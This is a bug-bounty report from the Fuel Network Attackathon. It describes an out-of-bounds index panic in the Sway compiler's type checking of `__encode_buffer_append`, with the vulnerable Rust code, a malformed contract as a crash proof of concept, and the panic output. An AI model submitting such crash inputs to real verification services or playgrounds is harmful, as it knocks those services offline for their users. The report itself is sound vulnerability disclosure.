# Attackathon \_ Fuel Network 33444 - \[Smart Contract - Insight] Sway compiler crash for access out-of-

Submitted on Sat Jul 20 2024 15:00:43 GMT-0400 (Atlantic Standard Time) by @ret2happy for [Attackathon | Fuel Network](https://immunefi.com/bounty/fuel-network-attackathon/)

Report ID: #33444

Report type: Smart Contract

Report severity: Insight

Target: <https://github.com/FuelLabs/sway/tree/v0.61.2>

Impacts:

* Compiler bug

## Description

## Brief/Intro

Sway compiler crash for access out-of-bound memory during arguments check in semantic analysis.

## Vulnerability Details

In `type_check_encode_append` function of the `semantic_analysis/ast_node/expression/intrinsic_function.rs#L239`, there's no length check for argument in \[1]. When the intrinsic function is defined with improper argument parameters, out-of-bound access happens in \[1].

```
fn type_check_encode_append(
    handler: &Handler,
    mut ctx: TypeCheckContext,
    kind: sway_ast::Intrinsic,
    arguments: &[Expression],
    _type_arguments: &[TypeArgument],
    span: Span,
) -> Result<(ty::TyIntrinsicFunctionKind, TypeId), ErrorEmitted> {
    let type_engine = ctx.engines.te();
    let engines = ctx.engines();

    let buffer_type = type_engine.insert(engines, encode_buffer_type(engines), None);
    let buffer_expr = {
        let ctx = ctx
            .by_ref()
            .with_help_text("")
            .with_type_annotation(buffer_type);
        ty::TyExpression::type_check(handler, ctx, &arguments[0])?
    };

    let item_span = arguments[1].span.clone(); // [1] no arguments length check before access. This leads to the out-of-bound vector access
```

## Impact Details

Online verification service or sway playground which accept sw contract could be crashed by the malicous sw contract.

## References

\[1] <https://github.com/FuelLabs/sway/blob/de853614a25ea96f569a340a5eb47653c5d150b6/sway-core/src/semantic\\_analysis/ast\\_node/expression/intrinsic\\_function.rs#L239>

## Proof of concept

## Proof of Concept

Compile the following contract using `forc build`:

```
library;

pub struct Buffer {
    buffer: u64
}

pub trait T {
    fn ar: (__e)
}

impl T for str[10] {
    fn a(self, buffer: Buffer) -> B {
        Buffer {
        buffer: __encode_buffer_append(buffer.buffer)
    }
}

```

Running it would get the following panic:

```
   Compiling library abi_superabis (/intrinstic_oob)
thread 'main' panicked at sway-core/src/semantic_analysis/ast_node/expression/intrinsic_function.rs:239:21:
index out of bounds: the len is 1 but the index is 1
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
```
